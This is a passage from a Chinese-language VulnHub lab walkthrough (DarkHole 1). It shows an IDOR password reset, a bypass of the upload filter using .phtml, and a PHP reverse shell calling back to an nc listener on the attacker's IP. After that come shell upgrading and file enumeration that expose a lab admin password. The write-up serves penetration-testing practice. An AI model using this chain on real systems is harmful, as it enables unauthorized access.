+</span></span></code></pre></td></tr></table></div></div><p>将id=2改为1然后发送观察到密码以及修改完成</p><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1.png srcset="/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1_hu_bea90983dbbb15e7.png 800w, /p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1_hu_6b48aa1e62694005.png 1600w, /p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index1.png 1920w" width=1920></p><p>回到登陆页面，尝试输入账户为admin 密码为1 可以发现登陆成功，账户是猜出来的，实际可经过各种尝试制作字典爆破尝试出账户名字</p><p>越权成功</p><h2 id=文件上传尝试>文件上传尝试</h2><p><img class=gallery-image data-flex-basis=375px data-flex-grow=156 height=1012 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2.png srcset="/p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2_hu_7495c7566012e158.png 800w, /p/darkhole1.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF2/index2.png 1584w" width=1584></p><p>多了一个文件夹上传的功能，上传php弹出Sorry , Allow Ex : jpg,png,gif 仅这三种格式 尝试用其他格式绕过，php3 php3 php5 最后发现phtml和phar有效</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ locate php-reverse-shell
+</span></span><span class=line><span class=cl>/usr/share/laudanum/php/php-reverse-shell.php
+</span></span><span class=line><span class=cl>/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+</span></span><span class=line><span class=cl>/usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php
+</span></span><span class=line><span class=cl>/usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverse-shell.php
+</span></span><span class=line><span class=cl>/usr/share/webshells/php/php-reverse-shell.php
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ cp /usr/share/webshells/php/php-reverse-shell.php sh.phtml
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nano sh.phtml 
+</span></span></code></pre></td></tr></table></div></div><p>$ip = &lsquo;10.10.10.10&rsquo;; // CHANGE THIS
+$port = 443; // CHANGE THIS</p><p>找到这两项修改第一行为kali ip 第二行为监听的端口可以说是443 也可以是高位端口</p><p>补充一个知识点: 监听1024以下的端口需要root权限</p><p>然后上传发现已经成功</p><h2 id=反弹shell>反弹shell</h2><p>在kali中开启监听
+sudo -lvnp 443</p><p>在upload页面点击这个修改的sh.phtml 回到kali发现监听成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nc -lvnp <span class=m>443</span>                                          
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.10.10<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.130<span class=o>]</span> <span class=m>43450</span>
+</span></span><span class=line><span class=cl>Linux darkhole 5.4.0-77-generic <span class=c1>#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl> 00:20:05 up  1:09,  <span class=m>0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=err>&#39;</span>t access tty<span class=p>;</span> job control turned off
+</span></span><span class=line><span class=cl>$ 
+</span></span></code></pre></td></tr></table></div></div><p>得到一个非交互式shell，尝试使用python变成交互shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>www-data@darkhole:/$ 
+</span></span></code></pre></td></tr></table></div></div><h2 id=尝试-sudo-提权失败>尝试 sudo 提权失败</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data: 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Sorry, try again.
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data: 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Sorry, try again.
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data: 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo: <span class=m>3</span> incorrect password attempts
+</span></span></code></pre></td></tr></table></div></div><h2 id=继续进行信息收集>继续进行信息收集</h2><p>对目录文件进行进行分析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/$ ls -liah                                               
+</span></span><span class=line><span class=cl>ls -liah                                                     
+</span></span><span class=line><span class=cl>total 3.9G
+</span></span><span class=line><span class=cl>      <span class=m>2</span> drwxr-xr-x  <span class=m>20</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl>      <span class=m>2</span> drwxr-xr-x  <span class=m>20</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl>     <span class=m>12</span> lrwxrwxrwx   <span class=m>1</span> root root    <span class=m>7</span> Feb  <span class=m>1</span>  <span class=m>2021</span> bin -&gt; usr/bin
+</span></span><span class=line><span class=cl>      <span class=m>2</span> drwxr-xr-x   <span class=m>4</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> boot
+</span></span><span class=line><span class=cl> <span class=m>786435</span> drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> cdrom
+</span></span><span class=line><span class=cl>      <span class=m>2</span> drwxr-xr-x  <span class=m>19</span> root root 4.1K Jul <span class=m>18</span> 04:22 dev
+</span></span><span class=line><span class=cl><span class=m>1048577</span> drwxr-xr-x  <span class=m>98</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> etc
+</span></span><span class=line><span class=cl> <span class=m>131073</span> drwxr-xr-x   <span class=m>4</span> root root 4.0K Jul <span class=m>16</span>  <span class=m>2021</span> home
+</span></span><span class=line><span class=cl>     <span class=m>13</span> lrwxrwxrwx   <span class=m>1</span> root root    <span class=m>7</span> Feb  <span class=m>1</span>  <span class=m>2021</span> lib -&gt; usr/lib
+</span></span><span class=line><span class=cl>     <span class=m>14</span> lrwxrwxrwx   <span class=m>1</span> root root    <span class=m>9</span> Feb  <span class=m>1</span>  <span class=m>2021</span> lib32 -&gt; usr/lib32
+</span></span><span class=line><span class=cl>     <span class=m>15</span> lrwxrwxrwx   <span class=m>1</span> root root    <span class=m>9</span> Feb  <span class=m>1</span>  <span class=m>2021</span> lib64 -&gt; usr/lib64
+</span></span><span class=line><span class=cl>     <span class=m>16</span> lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>10</span> Feb  <span class=m>1</span>  <span class=m>2021</span> libx32 -&gt; usr/libx32
+</span></span><span class=line><span class=cl>     <span class=m>11</span> drwx------   <span class=m>2</span> root root  16K Jul <span class=m>15</span>  <span class=m>2021</span> lost+found
+</span></span><span class=line><span class=cl> <span class=m>262145</span> drwxr-xr-x   <span class=m>2</span> root root 4.0K Feb  <span class=m>1</span>  <span class=m>2021</span> media
+</span></span><span class=line><span class=cl> <span class=m>393217</span> drwxr-xr-x   <span class=m>2</span> root root 4.0K Feb  <span class=m>1</span>  <span class=m>2021</span> mnt
+</span></span><span class=line><span class=cl> <span class=m>655361</span> drwxr-xr-x   <span class=m>2</span> root root 4.0K Feb  <span class=m>1</span>  <span class=m>2021</span> opt
+</span></span><span class=line><span class=cl>      <span class=m>1</span> dr-xr-xr-x <span class=m>277</span> root root    <span class=m>0</span> Jul <span class=m>18</span> 07:10 proc
+</span></span><span class=line><span class=cl> <span class=m>262146</span> drwx------   <span class=m>6</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> root
+</span></span><span class=line><span class=cl>      <span class=m>2</span> drwxr-xr-x  <span class=m>30</span> root root  <span class=m>880</span> Jul <span class=m>18</span> 09:17 run
+</span></span><span class=line><span class=cl>     <span class=m>17</span> lrwxrwxrwx   <span class=m>1</span> root root    <span class=m>8</span> Feb  <span class=m>1</span>  <span class=m>2021</span> sbin -&gt; usr/sbin
+</span></span><span class=line><span class=cl> <span class=m>393218</span> drwxr-xr-x   <span class=m>8</span> root root 4.0K Jul <span class=m>18</span> 09:17 snap
+</span></span><span class=line><span class=cl> <span class=m>786434</span> drwxr-xr-x   <span class=m>2</span> root root 4.0K Feb  <span class=m>1</span>  <span class=m>2021</span> srv
+</span></span><span class=line><span class=cl>     <span class=m>18</span> -rw-------   <span class=m>1</span> root root 3.9G Jul <span class=m>15</span>  <span class=m>2021</span> swap.img
+</span></span><span class=line><span class=cl>      <span class=m>1</span> dr-xr-xr-x  <span class=m>13</span> root root    <span class=m>0</span> Jul <span class=m>18</span> 07:10 sys
+</span></span><span class=line><span class=cl> <span class=m>924553</span> drwxrwxrwt   <span class=m>2</span> root root 4.0K Jul <span class=m>18</span> 00:23 tmp
+</span></span><span class=line><span class=cl> <span class=m>262147</span> drwxr-xr-x  <span class=m>15</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> usr
+</span></span><span class=line><span class=cl><span class=m>1048579</span> drwxr-xr-x  <span class=m>15</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> var
+</span></span><span class=line><span class=cl>www-data@darkhole:/$ ls /home
+</span></span><span class=line><span class=cl>ls /home
+</span></span><span class=line><span class=cl>darkhole  john
+</span></span><span class=line><span class=cl>www-data@darkhole:/$ <span class=nb>cd</span> /home/darkhole
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/darkhole
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/darkhole$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 32K
+</span></span><span class=line><span class=cl><span class=m>131103</span> drwxr-xr-x <span class=m>4</span> darkhole darkhole 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>131073</span> drwxr-xr-x <span class=m>4</span> root     root     4.0K Jul <span class=m>16</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>131129</span> -rw------- <span class=m>1</span> darkhole darkhole  <span class=m>189</span> Jul <span class=m>17</span>  <span class=m>2021</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>131105</span> -rw-r--r-- <span class=m>1</span> darkhole darkhole  <span class=m>220</span> Feb <span class=m>25</span>  <span class=m>2020</span> .bash_logout
+</span></span><span class=line><span class=cl><span class=m>131106</span> -rw-r--r-- <span class=m>1</span> darkhole darkhole 3.7K Feb <span class=m>25</span>  <span class=m>2020</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>131107</span> drwx------ <span class=m>2</span> darkhole darkhole 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> .cache
+</span></span><span class=line><span class=cl><span class=m>924549</span> drwxrwxr-x <span class=m>3</span> darkhole darkhole 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl><span class=m>131104</span> -rw-r--r-- <span class=m>1</span> darkhole darkhole  <span class=m>807</span> Feb <span class=m>25</span>  <span class=m>2020</span> .profile
+</span></span><span class=line><span class=cl><span class=m>131109</span> -rw-r--r-- <span class=m>1</span> darkhole darkhole    <span class=m>0</span> Jul <span class=m>15</span>  <span class=m>2021</span> .sudo_as_admin_successful
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/darkhole$ cat .bash_history
+</span></span><span class=line><span class=cl>cat .bash_history
+</span></span><span class=line><span class=cl>cat: .bash_history: Permission denied
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/darkhole$ <span class=nb>cd</span> ../john
+</span></span><span class=line><span class=cl><span class=nb>cd</span> ../john
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 72K
+</span></span><span class=line><span class=cl><span class=m>131110</span> drwxrwxrwx <span class=m>5</span> john john     4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>131073</span> drwxr-xr-x <span class=m>4</span> root root     4.0K Jul <span class=m>16</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>131128</span> -rw------- <span class=m>1</span> john john     1.7K Jul <span class=m>17</span>  <span class=m>2021</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>131112</span> -rw-r--r-- <span class=m>1</span> john john      <span class=m>220</span> Jul <span class=m>16</span>  <span class=m>2021</span> .bash_logout
+</span></span><span class=line><span class=cl><span class=m>131113</span> -rw-r--r-- <span class=m>1</span> john john     3.7K Jul <span class=m>16</span>  <span class=m>2021</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>131126</span> drwx------ <span class=m>2</span> john john     4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .cache
+</span></span><span class=line><span class=cl><span class=m>131115</span> drwxrwxr-x <span class=m>3</span> john john     4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl><span class=m>131114</span> -rw------- <span class=m>1</span> john john       <span class=m>37</span> Jul <span class=m>17</span>  <span class=m>2021</span> .mysql_history
+</span></span><span class=line><span class=cl><span class=m>131111</span> -rw-r--r-- <span class=m>1</span> john john      <span class=m>807</span> Jul <span class=m>16</span>  <span class=m>2021</span> .profile
+</span></span><span class=line><span class=cl><span class=m>131122</span> drwxrwx--- <span class=m>2</span> john www-data 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .ssh
+</span></span><span class=line><span class=cl><span class=m>131120</span> -rwxrwx--- <span class=m>1</span> john john        <span class=m>1</span> Jul <span class=m>17</span>  <span class=m>2021</span> file.py
+</span></span><span class=line><span class=cl><span class=m>131131</span> -rwxrwx--- <span class=m>1</span> john john        <span class=m>8</span> Jul <span class=m>17</span>  <span class=m>2021</span> password
+</span></span><span class=line><span class=cl><span class=m>131118</span> -rwsr-xr-x <span class=m>1</span> root root      17K Jul <span class=m>17</span>  <span class=m>2021</span> toto
+</span></span><span class=line><span class=cl><span class=m>131121</span> -rw-rw---- <span class=m>1</span> john john       <span class=m>24</span> Jul <span class=m>17</span>  <span class=m>2021</span> user.txt
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$ 
+</span></span></code></pre></td></tr></table></div></div><p>先解析一下命令 ls -liah</p><div class=table-wrapper><table><thead><tr><th>参数</th><th>含义</th><th>作用</th></tr></thead><tbody><tr><td><strong><code>-l</code></strong></td><td><strong>Long</strong>（长格式）</td><td>显示文件的详细信息（权限、所有者、大小、修改时间等）</td></tr><tr><td><strong><code>-i</code></strong></td><td><strong>Inode</strong>（索引节点)</td><td>显示每个文件或目录的 <strong>Inode 编号</strong>（文件系统内部的唯一标识符）</td></tr><tr><td><strong><code>-a</code></strong></td><td><strong>All</strong>（全部）</td><td>显示所有文件，包括以点（<code>.</code>）开头的<strong>隐藏文件</strong>（如 <code>.bashrc</code>、<code>.ssh</code>、<code>.env</code>）以及 <code>.</code>（当前目录）和 <code>..</code>（上级目录）</td></tr><tr><td><strong><code>-h</code></strong></td><td>Human-readable（人性化）</td><td>将文件大小显示为 <code>K</code>、<code>M</code>、<code>G</code> 等易读格式（如 <code>4.0K</code>），而不是冰冷的字节数</td></tr></tbody></table></div><p>可以知道home目录下有两个用户分别是john 和darkhole</p><p>继续看下去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/home/john$ <span class=nb>cd</span> /var/www     
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /var/www                                                       
+</span></span><span class=line><span class=cl>www-data@darkhole:/var/www$ ls -liah 
+</span></span><span class=line><span class=cl>ls -liah                                             
+</span></span><span class=line><span class=cl>total 16K                                            
+</span></span><span class=line><span class=cl> <span class=m>526293</span> drwxr-xr-x  <span class=m>3</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> . 
+</span></span><span class=line><span class=cl> <span class=m>1048579</span> drwxr-xr-x <span class=m>15</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl> <span class=m>533581</span> -rw-r--r--  <span class=m>1</span> root root 1.6K Jul <span class=m>17</span>  <span class=m>2021</span> darkhole.sql              
+</span></span><span class=line><span class=cl> <span class=m>667705</span> drwxrwxrwx  <span class=m>6</span> root root 4.0K Jul <span class=m>18</span>  <span class=m>2021</span> html
+</span></span><span class=line><span class=cl> www-data@darkhole:/var/www$ cat darkhole.sql 
+</span></span><span class=line><span class=cl>cat darkhole.sql
+</span></span><span class=line><span class=cl>-- phpMyAdmin SQL Dump                                          
+</span></span><span class=line><span class=cl>-- version 5.1.0                                    
+</span></span><span class=line><span class=cl>-- https://www.phpmyadmin.net/ 
+</span></span><span class=line><span class=cl>--                                          
+</span></span><span class=line><span class=cl>-- Host: 127.0.0.1                               
+</span></span><span class=line><span class=cl>-- Generation Time: Jul 17, <span class=m>2021</span> at 07:02 PM                       
+</span></span><span class=line><span class=cl>-- Server version: 10.4.19-MariaDB                                       
+</span></span><span class=line><span class=cl>-- PHP Version: 8.0.6 
+</span></span><span class=line><span class=cl>SET <span class=nv>SQL_MODE</span> <span class=o>=</span> <span class=s2>&#34;NO_AUTO_VALUE_ON_ZERO&#34;</span><span class=p>;</span>                  
+</span></span><span class=line><span class=cl>START TRANSACTION<span class=p>;</span>                  
+</span></span><span class=line><span class=cl>SET <span class=nv>time_zone</span> <span class=o>=</span> <span class=s2>&#34;+00:00&#34;</span><span class=p>;</span>                                                   
+</span></span><span class=line><span class=cl>/*!40101 SET @OLD_CHARACTER_SET_CLIENT<span class=o>=</span>@@CHARACTER_SET_CLIENT */<span class=p>;</span>           
+</span></span><span class=line><span class=cl>/*!40101 SET @OLD_CHARACTER_SET_RESULTS<span class=o>=</span>@@CHARACTER_SET_RESULTS */<span class=p>;</span>
+</span></span><span class=line><span class=cl>/*!40101 SET @OLD_COLLATION_CONNECTION<span class=o>=</span>@@COLLATION_CONNECTION */<span class=p>;</span>
+</span></span><span class=line><span class=cl>/*!40101 SET NAMES utf8mb4 */<span class=p>;</span>
+</span></span><span class=line><span class=cl>--             
+</span></span><span class=line><span class=cl>-- Database: <span class=sb>`</span>darkhole<span class=sb>`</span>                                  
+</span></span><span class=line><span class=cl>--                                                                          
+</span></span><span class=line><span class=cl>-- -------------------------------------------------------- 
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>-- Table structure <span class=k>for</span> table <span class=sb>`</span>users<span class=sb>`</span>
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>CREATE TABLE <span class=sb>`</span>users<span class=sb>`</span> <span class=o>(</span>
+</span></span><span class=line><span class=cl>  <span class=sb>`</span>id<span class=sb>`</span> int<span class=o>(</span>11<span class=o>)</span> NOT NULL,
+</span></span><span class=line><span class=cl>  <span class=sb>`</span>username<span class=sb>`</span> varchar<span class=o>(</span>40<span class=o>)</span> NOT NULL,
+</span></span><span class=line><span class=cl>  <span class=sb>`</span>email<span class=sb>`</span> varchar<span class=o>(</span>40<span class=o>)</span> NOT NULL,
+</span></span><span class=line><span class=cl>  <span class=sb>`</span>password<span class=sb>`</span> varchar<span class=o>(</span>50<span class=o>)</span> NOT NULL
+</span></span><span class=line><span class=cl><span class=o>)</span> <span class=nv>ENGINE</span><span class=o>=</span>InnoDB DEFAULT <span class=nv>CHARSET</span><span class=o>=</span>utf8mb4<span class=p>;</span>
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>-- Dumping data <span class=k>for</span> table <span class=sb>`</span>users<span class=sb>`</span>
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>INSERT INTO <span class=sb>`</span>users<span class=sb>`</span> <span class=o>(</span><span class=sb>`</span>id<span class=sb>`</span>, <span class=sb>`</span>username<span class=sb>`</span>, <span class=sb>`</span>email<span class=sb>`</span>, <span class=sb>`</span>password<span class=sb>`</span><span class=o>)</span> VALUES
+</span></span><span class=line><span class=cl><span class=o>(</span>1, <span class=s1>&#39;admin&#39;</span>, <span class=s1>&#39;admin@admin.com&#39;</span>, <span class=s1>&#39;EWIOEJIOejw@(#I(@djslKJ&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>-- Indexes <span class=k>for</span> dumped tables
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>-- Indexes <span class=k>for</span> table <span class=sb>`</span>users<span class=sb>`</span>
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>ALTER TABLE <span class=sb>`</span>users<span class=sb>`</span>
+</span></span><span class=line><span class=cl>  ADD PRIMARY KEY <span class=o>(</span><span class=sb>`</span>id<span class=sb>`</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>  ADD UNIQUE KEY <span class=sb>`</span>username<span class=sb>`</span> <span class=o>(</span><span class=sb>`</span>username<span class=sb>`</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>  ADD UNIQUE KEY <span class=sb>`</span>email<span class=sb>`</span> <span class=o>(</span><span class=sb>`</span>email<span class=sb>`</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>-- AUTO_INCREMENT <span class=k>for</span> dumped tables
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>--
+</span></span><span class=line><span class=cl>-- AUTO_INCREMENT <span class=k>for</span> table <span class=sb>`</span>users<span class=sb>`</span>
+</span></span><span class=line><span class=cl>--
